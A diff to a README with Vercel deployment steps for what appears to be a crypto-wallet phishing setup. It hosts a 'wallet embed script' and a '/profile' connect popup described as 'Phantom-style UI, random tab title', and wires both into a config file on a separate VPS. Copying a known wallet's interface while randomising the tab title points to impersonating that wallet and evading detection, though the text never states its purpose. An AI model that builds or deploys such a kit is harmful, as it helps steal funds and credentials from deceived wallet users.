@@ -1,29 +1,27 @@
 # Vercel — wallet JS bundle only
 
-Deploy **this folder** to Vercel. Nothing here is secret.
+Deploy **this folder** to Vercel. Hosts:
+
+| URL | What |
+|-----|------|
+| `/wallet.bundle.js` | Wallet embed script |
+| `/profile` | Connect popup (Phantom-style UI, random tab title) |
 
 ## Vercel dashboard
 
-- **Root Directory:** `vercel` ← required (Settings → General)
-- **Framework Preset:** Other
+- **Root Directory:** `vercel`
 - Build runs `npm run build` → `public/wallet.bundle.js`
-
-### 404 on the homepage?
-
-`https://your-app.vercel.app/` may 404 before this repo’s `index.html` is deployed — that is OK.
-
-Use the **bundle URL** (must include the file name):
-
-`https://your-app.vercel.app/wallet.bundle.js`
-
-Opening `/` in the browser is not the script URL your VPS needs.
+- `public/profile/index.html` is served at **`/profile`**
 
 ## After deploy
 
-Put the bundle URL in **`../vps/config.php`** on your Debian server:
+In **`../vps/config.php`**:
 
 ```php
 'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/wallet.bundle.js',
+// Popup URL auto-derived as https://YOUR-PROJECT.vercel.app/profile
+// Or set explicitly:
+// 'connect_popup_url' => 'https://YOUR-PROJECT.vercel.app/profile',
 ```
 
 ## Local build
